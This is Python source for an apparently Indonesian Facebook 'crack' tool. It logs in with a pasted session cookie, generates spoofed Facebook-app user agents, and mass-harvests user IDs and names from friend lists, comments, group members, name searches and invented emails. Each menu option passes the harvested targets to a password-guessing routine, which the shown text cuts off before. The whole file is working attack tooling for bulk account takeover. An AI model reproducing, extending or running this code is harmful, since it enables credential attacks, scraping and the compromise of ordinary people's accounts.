###----------[ IMPORT MODULE LAIN ]---------- ###
import os, sys, re, time, requests, calendar, random, bs4, uuid, json, subprocess, base64
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import date,datetime
from requests.exceptions import ConnectionError
ses = requests.Session()

###----------[ IMPORT MODULE RICH ]---------- ###
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich.console import Console
from rich.table import Table
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
console = Console()

###----------[ WARNA PRINT RICH ]---------- ###
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH

###----------[ GLOBAL NAMA ]---------- ###
sekarang = calendar.timegm(time.gmtime(time.time()))
tampung = []
ugent = []

###----------[ CEK WARNA TEMA ]---------- ###
try:
	file_color = open("data/theme_color","r").read()
	color_text = file_color.split("|")[0]
	color_panel = file_color.split("|")[1]
except:
	color_text = "[#00C8FF]"
	color_panel = "#00C8FF"

###----------[ GET DATA DARI DEVICE ]---------- ###
android_version = subprocess.check_output("getprop ro.build.version.release",shell=True).decode("utf-8").replace("\n","")
try:simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[1].replace("\n","")
except:simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[0].replace("\n","")
versi_app = str(random.randint(111111111,999999999))

###----------[ GENERATE USERAGENT ]---------- ###
for z in range(200):
	versi_android = str(random.randint(4,12))+".0.0"
	versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
	device = random.choice(["Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]","Mozilla/5.0 (Linux; U; Android 10;  en-us; GT-P280W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.4590.125 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"])
	dev = device.split(" Build/")[0]
	az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
	build = f"{random.choice(az)}{random.choice(az)}{random.choice(az)}{random.randint(10, 90)}{random.choice(az)}"
	versi = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
	verchrome = random.choice(["602.1.50","602.2.14","602.3.12","602.4.6","603.1.30","603.2.4","603.3.8","601.1.46"])
	mob = random.choice(["14A456","14B100","14C92","14D27","14E304","14F89","14G60","13C75","13D15","13E233","13E238","13F69","13G34","13G36"])
	ua = f"Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36 GoogleApp/13.44.10.26.arm64[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]",
	ua = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]",
	ua = f"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]",
	ua = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]",
	ua = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16D57[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Mozilla/5.0 (iPhone; CPU iPhone OS 12_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.116 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Mozilla/5.0 (Linux; Android 7.1.1; Moto G Play Build/NPIS26.48-43-2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Plus Build/NPSS26.116-64-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Mozilla/5.0 (Linux; Android 8.0.0; moto g(6) play Build/OPP27.91-87) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Plus Build/NPSS26.116-64-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Mozilla/5.0 (Linux; Android 7.1.1; Moto G Play) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.80 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Thunderbird/45.8.0[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6264; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Mozilla/5.0 (Linux; Android 9; SM-G960F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.157 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Mozilla/5.0 (Linux; Android 9; SM-G950F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.157 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Postman/9.27.0 Chrome/94.0.4606.81 Electron/15.5.7 Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Mozilla/5.0 (SMART-TV; Linux; Tizen 2.4.0) AppleWebkit/538.1 (KHTML, like Gecko) SamsungBrowser/1.1 tv Safari/538.1[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G531F Build/LMY48B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-G950F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.4 Chrome/59.0.3071.125 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-N920C Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.2 Chrome/56.0.2924.87 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G570M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.4 Chrome/59.0.3071.125 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Mozilla/5.0 (Linux; Android {versi_android}; LG-F320L Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{versi_chrome} Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG GT-I9505 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G532M Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.4 Chrome/59.0.3071.125 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaN8-00/012.002; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.0 Mobile Safari/533.4 3gpp-gba[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Nokia7610/2.0 (5.0509.0) SymbianOS/7.0s Series60/2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; 909) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Mozilla/5.0 (MeeGo; NokiaN9) AppleWebKit/534.13 (KHTML, like Gecko) NokiaBrowser/8.5.0 Mobile Safari/534.13[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Nokia5250/10.0.011 (SymbianOS/9.4; U; Series60/5.0 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Safari/525 3gpp-gba[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Mozilla/5.0 (Linux; Android {versi_android}; LG-F320L Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{versi_chrome} Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaN97-1/20.0.019; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) BrowserNG/7.1.18124[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	ua = f"Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; 909; Vodafone) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	#ua = f"Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]","Mozilla/5.0 (Linux; U; Android 10;  en-us; GT-P280W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.4590.125 Mobile Safari/537.36,{str(random.randint(70,150))};FBBV/54364624;FBDV/iPhone5,1;FBMD/iPhone;FBSN/iOS;FBSV/{str(versi).replace('_','.')};FBSS/2;FBCR/T-Mobile;FBID/phone;FBLC/en_US;FBOP/5;FBRV/0]"
	#ua = f"Mozilla/5.0 (Linux; Android {versi_android}; LG-F320L Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{versi_chrome} Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
#	ua = f"Dalvik/2.1.0 (Linux; U; Android {str(rr(6,20))}; Avvio_793 Build/KOT49H) [FBAN/Orca-Android;FBAV/3.0.1-release;FBLC/in_ID;FBBV/128764;FBCR/Tsel-PakaiSarung;FBMF/Avvio;FBBD/Avvio;FBDV/Avvio_793;FBSV/{str(rr(6,13))}.0;;FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=2.75,width=1080,height=2110}] FBBK/1"
#[FBAN/MessengerLite;FBAV/{versi_chrome};FBBV/193013937;FBDM/"+"{density=2.625,width=1080,height=1794};"+f"FBLC/en_US;FBRV/0;FBCR/Verizon;FBMF/Google;FBBD/google;FBPN/com.facebook.mlite;FBDV/Pixel 2;FBSV/{versi_android};FBBK/1;FBOP/1;FBCA/arm64-v8a:;
#FBDM/"+"{density=1.5,width=540,height=960};"+"FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.mlite;FBDV/vivo 1606;FBSV/{versi_android};FBOP/1;FBCA/armeabi-v7a:armeabi;]"
#[FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{versi_app};FBCR/Airtel;FBMF/Facebook/lge;FBBD/FEVER;FBDV/FEVER;FBSV/{versi_android};FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=2.75,width=1080,height=2179};FB_FW/1;])"
	if ua in ugent:pass
	else:ugent.append(ua)
	
###----------[ LOGO AUTHOR DAN VERSI]---------- ###
class Logo:
	
	###----------[ BERSIHKAN LAYAR ]---------- ###
	def bersihkan_layar(self):
		if "linux" in sys.platform.lower():
			try:os.system("clear")
			except:pass
		elif "win" in sys.platform.lower():
			try:os.system("cls")
			except:pass
		else:
			try:os.system("clear") 
			except:pass

	###----------[ LOGO ]---------- ###
	def logonya(self):
		self.bersihkan_layar()
		prints(Panel(f"""{color_text} {H2}ㅤㅤㅤ              
			     {M2}𝐖  𝚰  𝐑  𝐃  𝐀  𝐍  𝐀 """,width=120,style=f"{color_panel}"))
	

###----------[ BAGIAN LOGIN ]---------- ###
class Login:
	
	###----------[ FUNCTION INIT ]---------- ###
	def __init__(self):
		self.ip = ses.get("http://ip-api.com/json/").json()["query"]
		self.negara = ses.get("http://ip-api.com/json/").json()["country"]

	###----------[ MENU LOGIN ]---------- ###
	def menu_login(self):
		Logo().logonya()
		prints(Panel(f"{P2}{self.ip}",padding=(0,30),subtitle=f"{H2}{self.negara}",style=f"{color_panel}"))
		prints(Panel(f"""{P2}[{color_text}01{P2}]. Login Menggunakan Cookies
[{color_text}02{P2}]. login menggunakan kredensial""",width=80,padding=(0,15),style=f"{color_panel}"))
		login = console.input(f" {H2}• {P2}pilih menu : ")
		if login in["1","01"]:
			prints(Panel(f"""{P2}Masukkan Cookies Disini""",width=80,style=f"{color_panel}"))
			cookie = console.input(f" {H2}• {P2}masukan Cookie : ")
			#open("data/cookie","w").write(cookie)
			self.login_cookie(cookie)
		else:
			exit(prints(Panel(f"""{M2}🙏 maaf fitur ini belum tersedia, silahkan menunggu update selanjutnya""",width=80,style=f"{color_panel}")))
			
	###----------[ LOGIN COOKIE ]---------- ###
	def login_cookie(self,cookie):
		try:
			url = ses.get("https://m.facebook.com/",cookies={"cookie": cookie}).text
			if "Apa yang Anda pikirkan sekarang" in url:
				pass
			else:
				for z in url.find_all("a",href=True):
					if "Tidak, Terima Kasih" in z.text:
						get = ses.get("https://m.facebook.com"+z["href"],cookies={"cookie": cookie})
						parsing = parser(get.text,"html.parser")
						action = parsing.find("form",{"method":"post"})["action"]
						data = {
							"fb_dtsg":re.search('name="fb_dtsg" value="(.*?)"', str(get.text)).group(1),
							"jazoest":re.search('name="jazoest" value="(.*?)"', str(get.text)).group(1),
							"submit": "OK, Gunakan Data"
						}
						post = ses.post("https://m.facebook.com"+action,data=data,cookies={"cookie": cookie})
						break
			open("data/cookie","w").write(cookie)
			Menu().menu()
		except:
			prints(Panel(f"""{M2}Cookie Invalid, Silahkan Gunakan cookie Dari Akun Facebook Yang Lain""",width=80,style=f"{color_panel}"))
			sys.exit()
		
	###----------[ UBAH BAHASA ]---------- ###
	def ubah_bahasa(self,cookie):
		try:
			url = ses.get("https://m.facebook.com/language/",cookies={"cookie": cookie})
			parsing = parser(url.text,"html.parser")
			for x in parsing.find_all("form",{"method":"post"}):
				if "Bahasa Indonesia" in str(x):
					data = {
						"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(url.text)).group(1),
						"jazoest" : re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),
						"submit"  : "Bahasa Indonesia"
					}
					post = ses.post("https://m.facebook.com"+x["action"],data=data,cookies={"cookie": cookie})
		except:
			pass
		
###----------[ BAGIAN MENU ]---------- ###
class Menu:
	
	###----------[ FUNCTION INIT ]---------- ###
	def __init__(self):
		self.men = []
		self.id = []
		self.ip = ses.get("http://ip-api.com/json/").json()["query"]
		self.negara = ses.get("http://ip-api.com/json/").json()["country"]

	###----------[ CEK INFO LOGIN ]---------- ###
	def cek_login(self,cookie):
		try:
			url = ses.get("https://m.facebook.com/profile.php",cookies=cookie).text
			nama = re.findall("<title>(.*?)</title>",url)[0]
			if "Konten Tidak Ditemukan" in nama:
				try:os.remove("data/cookie")
				except:pass
				Login().menu_login()
			else:
				return nama
		except ConnectionError:
			prints(Panel(f"""{M2}Koneksi Internet Hilang""",width=80,style=f"{color_panel}"))
			exit()
			
	###----------[ MENU UTAMA ]---------- ###
	def menu(self):
		Logo().logonya()
		
		###----------[ GET COOKIE DAN DATA ]---------- ###
		try:
			cok = open("data/cookie","r").read()
			cookie = {"cookie": cok}
			nama = self.cek_login(cookie)
		except:
			try:os.remove("data/cookie")
			except:pass
			Login().menu_login()
		
		###----------[ PANEL BIASA ]---------- ###
		prints(Panel(f"  {P2}{self.ip}",padding=(0,30),title=f"{H2}{nama}",subtitle=f"{H2}{self.negara}",style=f"{color_panel}"))
		prints(Panel(f"""{P2}[{color_text}01{P2}]. Crack Id Publik   [{color_text}05{P2}]. Crack Random Username
[{color_text}02{P2}]. Crack Pengikut    [{color_text}06{P2}]. Crack Pencarian Nama
[{color_text}03{P2}]. Crack Komentar    [{color_text}07{P2}]. Crack Member Grup
[{color_text}04{P2}]. Crack Random Mail [{color_text}08{P2}]. Crack File Sendiri""",width=80,padding=(0,6),style=f"{color_panel}"))
		prints(Panel(f"""{P2}ketik {H2}bot{P2} Untuk Ke Menu Bot & Ketik {H2}lain{P2} Untuk Ke Menu Lain""",width=80,padding=(0,6),style=f"{color_panel}"))
		menu = console.input(f" {H2}• {P2}pilih menu : ")
		
		###----------[ ID PUBLIK ]---------- ###
		if menu in["1","01"]:
			prints(Panel(f"""{P2}Masukan Id Target, Pastikan Id Target Bersifat Publik dan Tidak Private""",subtitle=f"{P2}ketik {H2}me{P2} Untuk Dump Dari Teman Sendiri",width=80	,style=f"{color_panel}"))
			user = console.input(f" {H2}• {P2}Masukan Id Atau Username : ")
			if user in["Me","me"]:
				user = Dump(cookie).GetUser()
			Dump(cookie).Dump_Publik(f"https://m.facebook.com/{user}?v=friends")
			Crack().atursandi()
			
		###----------[ KOMENTAR ]---------- ###
		elif menu in["3","03"]:
			prints(Panel(f"""{P2}masukan id postingan, pastikan postingan bersifat publik dan tidak private""",width=80,style=f"{color_panel}"))
			user = console.input(f" {H2}• {P2}masukan id postingan : ")
			Dump(cookie).Dump_Komentar(f"https://m.facebook.com/{user}")
			Crack().atursandi()
			
		###----------[ EMAIL ]---------- ###
		elif menu in["4","04"]:
			prints(Panel(f"""{P2}masukan nama dan format email gunakan '@' di awal contoh @gmail.com""",width=80,style=f"{color_panel}"))
			user = console.input(f" {H2}• {P2}masukan nama : ")
			format = console.input(f" {H2}• {P2}masukan format : ")
			limit = console.input(f" {H2}• {P2}masukan limit : ")
			Dump(cookie).Dump_Email(user,format,limit)
			Crack().atursandi()
			
		###----------[ USERNAME ]---------- ###
		elif menu in["5","05"]:
			prints(Panel(f"""{P2}masukan nama dan jika 2 kata bisa gunakan titik '.' sebagai pemisah""",width=80,style=f"{color_panel}"))
			user = console.input(f" {H2}• {P2}masukan nama : ")
			limit = console.input(f" {H2}• {P2}masukan limit : ")
			Dump(cookie).Dump_Username(user,limit)
			Crack().atursandi()
			
		###----------[ PENCARIAN NAMA ]---------- ###
		elif menu in["6","06"]:
			prints(Panel(f"""{P2}kamu bisa menggunakan koma (,) sebagai pemisah jika lebih dari 1 nama""",width=80,style=f"{color_panel}"))
			user = console.input(f" {H2}• {P2}masukan nama : ")
			common = open("asset/nama_indonesia","r").read().splitlines()
			for idt in user.split(","):
				self.id.append(idt)
				for people in common:
					self.id.append(people+" "+idt)
			try:
				for gas in self.id:
					Dump(cookie).Dump_Pencarian(f"https://m.facebook.com/public/{gas}")
			except:pass
			Crack().atursandi()
		
		###----------[ MEMBER GRUP ]---------- ###
		elif menu in["7","07"]:
			prints(Panel(f"""{P2}masukan id grup, pastikan grup bersifat publik dan tidak private""",width=80,style=f"{color_panel}"))
			user = console.input(f" {H2}• {P2}masukan id grup : ")
			Dump(cookie).Dump_MemberGrup(f"https://m.facebook.com/groups/{user}")
			Crack().atursandi()
			
		###----------[ FILE MASSAL ]---------- ###
		elif menu in["8","08"]:
			prints(Panel(f"""{P2}masukan tempat file, pastikan izin ke penyimpanan sudah diaktifkan""",width=80,style=f"{color_panel}"))
			user = console.input(f" {H2}• {P2}masukan tempat file : ")
			Dump(cookie).Dump_File(user)
			Crack().atursandi()

		###----------[ PINDAH KE MENU BOT ]---------- ###
		elif menu in["BOT","Bot","bot"]:
			exit(prints(Panel(f"""{M2}🙏 maaf fitur ini belum tersedia, silahkan menunggu update selanjutnya""",width=80,style=f"{color_panel}")))
			
		###----------[ PINDAH KE MENU LAIN ]---------- ###
		elif menu in["LAIN","Lain","lain"]:
			Lain(cookie).menu()
			
		else:
			exit(prints(Panel(f"""{M2}🙏 maaf fitur ini belum tersedia, silahkan menunggu update selanjutnya""",width=80,style=f"{color_panel}")))
			
###----------[ BAGIAN DUMP ]---------- ###
class Dump:
	
	###----------[ FUNCTION INIT ]---------- ###
	def __init__(self,cookie):
		self.cookie = cookie
			
	###----------[ GET USER SENDIRI ]---------- ###
	def GetUser(self):
		try:
			url = ses.get("https://m.facebook.com/profile.php",cookies=self.cookie).text
			uid = re.findall('name="target" value="(.*?)"',url)[0]
			return uid
		except:
			pass

	###----------[ DUMP ID PUBLIK ]---------- ###
	def Dump_Publik(self,url):
		try:
			url = parser(ses.get(url,cookies=self.cookie).text,"html.parser")
			for z in url.find_all("a",href=True):
				if "fref" in z.get("href"):
					if "/profile.php?id=" in z.get("href"):uid = "".join(bs4.re.findall("profile\.php\?id=(.*?)&",z.get("href")));nama = z.text
					else:uid = "".join(bs4.re.findall("/(.*?)\?",z.get("href")));nama = z.text
					if uid+"<=>"+nama in tampung:pass
					else:tampung.append(uid+"<=>"+nama)
					console.print(f" {H2}• {P2}sedang proses mengumpulkan id, berhasil mendapatkan {len(tampung)} id....", end="\r")
